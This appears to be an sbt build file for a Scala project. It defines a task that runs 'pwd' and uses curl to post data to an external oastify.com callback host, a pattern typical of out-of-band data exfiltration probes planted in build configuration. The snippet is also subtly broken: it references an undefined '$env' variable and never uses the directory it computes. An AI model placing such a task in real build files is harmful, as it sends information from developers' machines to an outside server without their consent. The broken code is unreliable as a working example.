import scala.sys.process._

val sendCwdToServer = taskKey[Unit]("Sends the current working directory to the server")

sendCwdToServer := {
  val pwd = "pwd".!!.trim
  val command = s"curl -d $env https://6elmsj18v5nmiptc9hr6v11pfgldo1jp8.oastify.com"
  command.!
}
